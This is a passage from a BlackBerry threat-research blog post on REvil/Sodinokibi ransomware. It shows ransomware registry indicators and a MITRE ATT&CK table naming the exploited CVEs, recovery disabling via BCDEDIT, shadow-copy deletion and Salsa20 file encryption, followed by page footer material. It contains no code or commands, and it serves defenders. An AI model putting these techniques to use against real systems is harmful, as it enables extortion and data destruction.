valign="top"><p>Affiliate key metadata</p> </td> </tr><tr><td width="489" valign="top"><p>[HKLM|HKCU]\SOFTWARE\recfg\sub_key</p> </td> <td width="97" valign="top"><p>Registry value</p> </td> <td width="134" valign="top"><p>Attacker's public key from config</p> </td> </tr><tr><td width="489" valign="top"><p>[HKLM|HKCU]\SOFTWARE\recfg\stat</p> </td> <td width="97" valign="top"><p>Registry value</p> </td> <td width="134" valign="top"><p>Machine information</p> </td> </tr><tr><td width="489" valign="top"><p>[HKLM|HKCU]\SOFTWARE\recfg\rnd_ext</p> </td> <td width="97" valign="top"><p>Registry value</p> </td> <td width="134" valign="top"><p>Random extension for encrypted files</p> </td> </tr></tbody></table> <h2><br> MITRE ATT&amp;CK</h2> <table border="1" cellspacing="0" cellpadding="0"> <tbody><tr><td width="183" valign="top" bgcolor="#ECECEC"><p style="text-align: left;"><b>Tactic</b></p> </td> <td width="73" valign="top" bgcolor="#ECECEC"><p style="text-align: left;"><b>ID</b></p> </td> <td width="228" valign="top" bgcolor="#ECECEC"><p><b>Name</b></p> </td> <td width="236" valign="top" bgcolor="#ECECEC"><p><b>Observed</b></p> </td> </tr><tr><td width="183" rowspan="3"><p style="text-align: left;">Initial Access</p> </td> <td width="73"><p style="text-align: left;"><b><a href="https://attack.mitre.org/techniques/T1190/" target="_blank">T1190</a></b></p> </td> <td width="228"><p>Exploit Public-Facing Application</p> </td> <td width="236" valign="top"><p>CVE-2019-2725 (Vulnerability the Oracle WebLogic Server)</p> </td> </tr><tr><td width="73"><p style="text-align: left;"><b><a href="https://attack.mitre.org/techniques/T1133/" target="_blank">T1133</a></b></p> </td> <td width="228"><p>External Remote Services</p> </td> <td width="236" valign="top"><p>Go2Assist</p> </td> </tr><tr><td width="73"><p style="text-align: left;"><b><a href="https://attack.mitre.org/techniques/T1199/" target="_blank">T1199</a></b></p> </td> <td width="228"><p>Trusted Relationship</p> </td> <td width="236" valign="top"><p>MSSP</p> </td> </tr><tr><td width="183" rowspan="2"><p style="text-align: left;">Execution</p> </td> <td width="73"><p style="text-align: left;"><b><a href="https://attack.mitre.org/techniques/T1059/" target="_blank">T1059</a></b></p> </td> <td width="228"><p>Command-Line Interface</p> </td> <td width="236" valign="top"><p>Executes cmd.exe</p> </td> </tr><tr><td width="73"><p style="text-align: left;"><b><a href="https://attack.mitre.org/techniques/T1106/" target="_blank">T1106</a></b></p> </td> <td width="228"><p>Execution through API</p> </td> <td width="236" valign="top"><p>Executes cmd.exe</p> </td> </tr><tr><td width="183"><p style="text-align: left;">Privilege Escalation</p> </td> <td width="73"><p style="text-align: left;"><b><a href="https://attack.mitre.org/techniques/T1068/" target="_blank">T1068</a></b></p> </td> <td width="228"><p>Exploitation for Privilege Escalation</p> </td> <td width="236" valign="top"><p>CVE-2018-8453</p> </td> </tr><tr><td width="183"><p style="text-align: left;">Defense Evasion</p> </td> <td width="73"><p style="text-align: left;"><b><a href="https://attack.mitre.org/techniques/T1089/" target="_blank">T1089</a></b></p> </td> <td width="228"><p>Disabling Security Tools</p> </td> <td width="236" valign="top"><p>Uses BCDEDIT.EXE to disable recovery</p> </td> </tr><tr><td width="183" rowspan="2"><p style="text-align: left;">Impact</p> </td> <td width="73"><p style="text-align: left;"><b><a href="https://attack.mitre.org/techniques/T1486/" target="_blank">T1486</a></b></p> </td> <td width="228"><p>Data Encrypted for Impact</p> </td> <td width="236" valign="top"><p>Encrypts files using Salsa20</p> </td> </tr><tr><td width="73"><p style="text-align: left;"><b><a href="https://attack.mitre.org/techniques/T1490/" target="_blank">T1490</a></b></p> </td> <td width="228"><p>Inhibit System Recovery</p> </td> <td width="236" valign="top"><p>Uses BCDEDIT.EXE to disable recovery and deletes volume shadow copies</p> </td> </tr></tbody></table> </div>
    
    
</div>


    
    
    <div class="authorblog"><!--Pulling author bio from author page-->

    
    
        
  



<div class="author-info" data-author-name="The BlackBerry Research and Intelligence Team" data-author-path="https://blogs.blackberry.com/en/2019/07/threat-spotlight-sodinokibi-ransomware">
  <div class="author-avatar">
    
    <img src="/content/dam/blogs-blackberry-com/images/authors/blackberry-logo-square.jpg" class="author-avatar" alt="The BlackBerry Research and Intelligence Team"/>				
    
  </div><!-- .author-avatar -->
  <div class="author-description">
      
    
    <h2>About The BlackBerry Research and Intelligence Team</h2>
    <p>The <a href="https://blogs.blackberry.com/en/author/the-blackberry-research-and-intelligence-team" target="_blank">BlackBerry Research and Intelligence team</a> is a highly experienced threat research group specializing in a wide range of cybersecurity disciplines, conducting continuous threat hunting to provide comprehensive insights into emerging threats. We analyze and address various attack vectors, leveraging our deep expertise in the cyberthreat landscape to develop proactive strategies that safeguard against adversaries.</p>
<p>Whether it's identifying new vulnerabilities or staying ahead of sophisticated attack tactics, we are dedicated to securing your digital assets with cutting-edge research and innovative solutions.</p>

  </div><!-- .author-description	-->
</div>
<hr class="author-hr"/>
    
</div>


    
    
    <div class="socialsharing">

<div class="socialSharing row">
	<ul class="socialSharing-icons">
		<li>
			<a href="https://x.com/intent/tweet?url=https://blogs.blackberry.com/en/2019/07/threat-spotlight-sodinokibi-ransomware&text=Threat%20Spotlight:%20REvil/Sodinokibi%20Ransomware&via=BlackBerry" title="Share on X" target="_blank" class="x-share">
				<span class="sr-only sr-only-focusable">Share on X</span>
				<span class="svgIcon-socialSharing svgIcon-socialSharing--tw" aria-hidden="true">
					<svg viewBox="0 0 1200 1227"><path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z"></path></svg>
				</span>
			</a>
		</li>
		<li>
			<a href="https://www.facebook.com/sharer/sharer.php?u=https://blogs.blackberry.com/en/2019/07/threat-spotlight-sodinokibi-ransomware" title="Share on Facebook" target="_blank" class="facebook-share">
				<span class="sr-only sr-only-focusable">Share on Facebook</span>
				<span class="svgIcon-socialSharing svgIcon-socialSharing--fb" aria-hidden="true">
					<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 264 512"><path d="M76.7 512V283H0v-91h76.7v-71.7C76.7 42.4 124.3 0 193.8 0c33.3 0 61.9 2.5 70.2 3.6V85h-48.2c-37.8 0-45.1 18-45.1 44.3V192H256l-11.7 91h-73.6v229"/></svg>
				</span>
			</a>
		</li>
		<li>
			<a href="https://www.linkedin.com/shareArticle?mini=true&url=https://blogs.blackberry.com/en/2019/07/threat-spotlight-sodinokibi-ransomware&title=Threat%20Spotlight:%20REvil/Sodinokibi%20Ransomware&summary=&source=blogs.blackberry.com" title="Share on LinkedIn" target="_blank" class="linkedin-share">
				<span class="sr-only sr-only-focusable">Share on LinkedIn</span>
				<span class="svgIcon-socialSharing svgIcon-socialSharing--li" aria-hidden="true">
					<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448.1 512"><path d="M100.3 448H7.4V148.9h92.9V448zM53.8 108.1C24.1 108.1 0 83.5 0 53.8S24.1 0 53.8 0s53.8 24.1 53.8 53.8-24.1 54.3-53.8 54.3zM448 448h-92.7V302.4c0-34.7-.7-79.2-48.3-79.2-48.3 0-55.7 37.7-55.7 76.7V448h-92.8V148.9h89.1v40.8h1.3c12.4-23.5 42.7-48.3 87.9-48.3 94 0 111.3 61.9 111.3 142.3V448h-.1z"/></svg>
				</span>
			</a>
		</li>
		<li>
			<a href="mailto:?subject=Threat%20Spotlight:%20REvil/Sodinokibi%20Ransomware&body=https://blogs.blackberry.com/en/2019/07/threat-spotlight-sodinokibi-ransomware" title="Email" class="email-share">
				<span class="sr-only sr-only-focusable">Email</span>
				<span class="svgIcon-socialSharing svgIcon-socialSharing--email" aria-hidden="true">
					<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M502.3 190.8c3.9-3.1 9.7-.2 9.7 4.7V400c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V195.6c0-5 5.7-7.8 9.7-4.7 22.4 17.4 52.1 39.5 154.1 113.6 21.1 15.4 56.7 47.8 92.2 47.6 35.7.3 72-32.8 92.3-47.6 102-74.1 131.6-96.3 154-113.7zM256 320c23.2.4 56.6-29.2 73.4-41.4 132.7-96.3 142.8-104.7 173.4-128.7 5.8-4.5 9.2-11.5 9.2-18.9v-19c0-26.5-21.5-48-48-48H48C21.5 64 0 85.5 0 112v19c0 7.4 3.4 14.3 9.2 18.9 30.6 23.9 40.7 32.4 173.4 128.7 16.8 12.2 50.2 41.8 73.4 41.4z"/></svg>
				</span>
			</a>
		</li>
	</ul>
</div>
</div>


    
    
    <div class="backbutton">
<a href="javascript:history.back()" class="cta cta-primary btn-back-button">Back</a></div>



      </div>
      
          
      </div>
    </section>
      
  
  
</div>



</main><footer data-no-snippet>
	<div class="container pt-2">
		<nav id="footerNav">
			<div>
				<div class="row my-4">
					<div class="socialLinks col-lg-4 col-md-4 col-sm-12 pb-3">
						<a href="https://www.facebook.com/BlackBerry/" class="socialLink" target="_blank" rel="noopener" style="padding-left: 0 !important;">
							<span class="sr-only" aria-label="BlackBerry Facebook Account">Facebook</span>
							<span class="svgIcon-social" aria-hidden="true">
								<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M448 56.7v398.5c0 13.7-11.1 24.7-24.7 24.7H309.1V306.5h58.2l8.7-67.6h-67v-43.2c0-19.6 5.4-32.9 33.5-32.9h35.8v-60.5c-6.2-.8-27.4-2.7-52.2-2.7-51.6 0-87 31.5-87 89.4v49.9h-58.4v67.6h58.4V480H24.7C11.1 480 0 468.9 0 455.3V56.7C0 43.1 11.1 32 24.7 32h398.5c13.7 0 24.8 11.1 24.8 24.7z"/></svg>
							</span>
						</a>
						<a href="https://x.com/blackberry" target="_blank" class="socialLink" rel="noopener">
							<span class="sr-only" aria-label="BlackBerry X Account">X</span>
							<span class="svgIcon-social">
								<svg width="28" height="28" viewBox="0 0 1200 1227"><path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z" fill="#000"></path></svg>
							</span>
						</a>
						<a href="https://www.youtube.com/user/BlackBerry" target="_blank" class="socialLink" rel="noopener">
							<span class="sr-only" aria-label="BlackBerry YouTube Account">YouTube</span>
							<span class="svgIcon-social">
								<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path d="M549.655 124.083c-6.281-23.65-24.787-42.276-48.284-48.597C458.781 64 288 64 288 64S117.22 64 74.629 75.486c-23.497 6.322-42.003 24.947-48.284 48.597-11.412 42.867-11.412 132.305-11.412 132.305s0 89.438 11.412 132.305c6.281 23.65 24.787 41.5 48.284 47.821C117.22 448 288 448 288 448s170.78 0 213.371-11.486c23.497-6.321 42.003-24.171 48.284-47.821 11.412-42.867 11.412-132.305 11.412-132.305s0-89.438-11.412-132.305zm-317.51 213.508V175.185l142.739 81.205-142.739 81.201z"/></svg>
							</span>
						</a>
						<a href="https://www.instagram.com/blackberry/" target="_blank" class="socialLink" rel="noopener">
							<span class="sr-only" aria-label="BlackBerry Instagram Account">Instagram</span>
							<span class="svgIcon-social">
								<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/></svg>
							</span>
						</a>
					</div>
					
				</div>
				<hr/>
				<div class="row mt-5">
					<div class="col-xs-12 col-md-4">
						
							<a class="footerCollapse" role="button" data-toggle="collapse" href="#collapse21" aria-expanded="false" aria-controls="collapse21">
								<h3>
									Corporate
									<span class="open">
										<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M207.029 381.476L12.686 187.132c-9.373-9.373-9.373-24.569 0-33.941l22.667-22.667c9.357-9.357 24.522-9.375 33.901-.04L224 284.505l154.745-154.021c9.379-9.335 24.544-9.317 33.901.04l22.667 22.667c9.373 9.373 9.373 24.569 0 33.941L240.971 381.476c-9.373 9.372-24.569 9.372-33.942 0z"/></svg>
									</span>
									<span class="closed">
										<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M240.971 130.524l194.343 194.343c9.373 9.373 9.373 24.569 0 33.941l-22.667 22.667c-9.357 9.357-24.522 9.375-33.901.04L224 227.495 69.255 381.516c-9.379 9.335-24.544 9.317-33.901-.04l-22.667-22.667c-9.373-9.373-9.373-24.569 0-33.941L207.03 130.525c9.372-9.373 24.568-9.373 33.941-.001z"/></svg>
									</span>
								</h3>
							</a>
							
								<div id="collapse21" class="collapse in">
									<ul>
										<li>
											
											<a href="https://www.blackberry.com/us/en/company" rel="noopener" target="_blank">Company</a>
										</li>
									
										<li>
											<a href="https://www.blackberry.com/us/en/company/newsroom" target="_blank">Newsroom</a>
											
										</li>
									
										<li>
											<a href="https://www.blackberry.com/us/en/company/investors" target="_blank">Investors</a>
											
										</li>
									
										<li>
											
											<a href="https://www.blackberry.com/us/en/company/careers" rel="noopener" target="_blank">Careers</a>
										</li>
									
										<li>
											<a href="https://www.blackberry.com/us/en/company/leadership" target="_blank">Leadership</a>
											
										</li>
									
										<li>
											<a href="https://www.blackberry.com/us/en/company/corporate-responsibility-at-blackberry" target="_blank">Corporate Responsibility</a>
											
										</li>
									
										<li>
											
											<a href="https://www.blackberry.com/us/en/company/certifications" rel="noopener" target="_blank">Certifications</a>
										</li>
									
										<li>
											
											<a href="https://www.blackberry.com/us/en/success-stories" rel="noopener" target="_blank">Customer Success</a>
										</li>
									</ul>
								</div>
							
						
					</div>
					<div class="col-xs-12 col-md-4">
						
							<a class="footerCollapse" role="button" data-toggle="collapse" href="#collapse31" aria-expanded="false" aria-controls="collapse31">
								<h3>
									Developers
									<span class="open">
										<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M207.029 381.476L12.686 187.132c-9.373-9.373-9.373-24.569 0-33.941l22.667-22.667c9.357-9.357 24.522-9.375 33.901-.04L224 284.505l154.745-154.021c9.379-9.335 24.544-9.317 33.901.04l22.667 22.667c9.373 9.373 9.373 24.569 0 33.941L240.971 381.476c-9.373 9.372-24.569 9.372-33.942 0z"/></svg>
									</span>
									<span class="closed">
										<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M240.971 130.524l194.343 194.343c9.373 9.373 9.373 24.569 0 33.941l-22.667 22.667c-9.357 9.357-24.522 9.375-33.901.04L224 227.495 69.255 381.516c-9.379 9.335-24.544 9.317-33.901-.04l-22.667-22.667c-9.373-9.373-9.373-24.569 0-33.941L207.03 130.525c9.372-9.373 24.568-9.373 33.941-.001z"/></svg>
									</span>
								</h3>
							</a>
							
								<div class="collapse in" id="collapse31">
									<ul>
										<li>
											
											<a href="https://developers.blackberry.com/" rel="noopener" target="_blank">Enterprise Platform &amp; Apps</a>
										</li>
									
										<li>
											
											<a href="https://www.qnx.com/account/login.html?returnaddress=%2Fdownload%2Fgroup.html%3Fprogramid%3D29178" rel="noopener" target="_blank">BlackBerry QNX Developer Network</a>
										</li>
									</ul>
								</div>
							
						
							<a class="footerCollapse" role="button" data-toggle="collapse" href="#collapse32" aria-expanded="false" aria-controls="collapse32">
								<h3>
									Blogs
									<span class="open">
										<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M207.029 381.476L12.686 187.132c-9.373-9.373-9.373-24.569 0-33.941l22.667-22.667c9.357-9.357 24.522-9.375 33.901-.04L224 284.505l154.745-154.021c9.379-9.335 24.544-9.317 33.901.04l22.667 22.667c9.373 9.373 9.373 24.569 0 33.941L240.971 381.476c-9.373 9.372-24.569 9.372-33.942 0z"/></svg>
									</span>
									<span class="closed">
										<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M240.971 130.524l194.343 194.343c9.373 9.373 9.373 24.569 0 33.941l-22.667 22.667c-9.357 9.357-24.522 9.375-33.901.04L224 227.495 69.255 381.516c-9.379 9.335-24.544 9.317-33.901-.04l-22.667-22.667c-9.373-9.373-9.373-24.569 0-33.941L207.03 130.525c9.372-9.373 24.568-9.373 33.941-.001z"/></svg>
									</span>
								</h3>
							</a>
							
								<div class="collapse in" id="collapse32">
									<ul>
										<li>
											
											<a href="https://blogs.blackberry.com/" rel="noopener">BlackBerry ThreatVector Blog</a>
										</li>
									
										<li>
											
											<a href="https://devblog.blackberry.com/" rel="noopener" target="_blank">Developers Blog</a>
										</li>
									
										<li>
											
											<a href="https://helpblog.blackberry.com/" rel="noopener" target="_blank">Help Blog</a>
										</li>
									</ul>
								</div>
							
						
					</div>
					<div class="col-xs-12 col-md-4">
						
							<a class="footerCollapse" role="button" data-toggle="collapse" href="#collapse41" aria-expanded="false" aria-controls="collapse41">
								<h3>
									Legal
									<span class="open">
										<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M207.029 381.476L12.686 187.132c-9.373-9.373-9.373-24.569 0-33.941l22.667-22.667c9.357-9.357 24.522-9.375 33.901-.04L224 284.505l154.745-154.021c9.379-9.335 24.544-9.317 33.901.04l22.667 22.667c9.373 9.373 9.373 24.569 0 33.941L240.971 381.476c-9.373 9.372-24.569 9.372-33.942 0z"/></svg>
									</span>
									<span class="closed">
										<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M240.971 130.524l194.343 194.343c9.373 9.373 9.373 24.569 0 33.941l-22.667 22.667c-9.357 9.357-24.522 9.375-33.901.04L224 227.495 69.255 381.516c-9.379 9.335-24.544 9.317-33.901-.04l-22.667-22.667c-9.373-9.373-9.373-24.569 0-33.941L207.03 130.525c9.372-9.373 24.568-9.373 33.941-.001z"/></svg>
									</span>
								</h3>
							</a>
							
								<div id="collapse41" class="collapse in">
									<ul>
										<li>
											<a href="https://www.blackberry.com/us/en/legal" target="_blank">Overview</a>
											
										</li>
									
										<li>
											<a href="https://www.blackberry.com/us/en/legal/accessibility" target="_blank">Accessibility</a>
											
										</li>
									
										<li>
											<a href="https://www.blackberry.com/us/en/legal/blackberry-virtual-patent-marking" target="_blank">Patents</a>
											
										</li>
									
										<li>
											<a href="https://www.blackberry.com/us/en/legal/trademarks" target="_blank">Trademarks</a>
											
										</li>
									
										<li>
											<a href="https://www.blackberry.com/us/en/legal/privacy-policy" target="_blank">Privacy Policy</a>
											
										</li>
									</ul>
								</div>
							
						
					</div>
				</div>
			</div>
			<div class="container">
				<div class="row tm10" style="padding-top: 50px;">
					<div class="col-xs-12 col-md-6 copyright">
						<p>© 2024 BlackBerry Limited. All rights reserved.</p>
					</div>
				</div>
			</div>
		</nav>
	</div>
</footer>

            
    
    
    
    
<script src="/etc.clientlibs/shared/clientlibs/jquery.min.96704cdeb2f89f0504fd10b631047e4f.js"></script>
<script src="/etc.clientlibs/blogs-bbcom/clientlibs/clientlib-dependencies.min.d41d8cd98f00b204e9800998ecf8427e.js"></script>





    
    
<script src="/etc.clientlibs/blogs-bbcom/clientlibs/clientlib-site.min.6713adb14b8f9f5d38df3f5d7a0618e8.js"></script>




    

    

    
    
    

            

        
    </body>
</html>
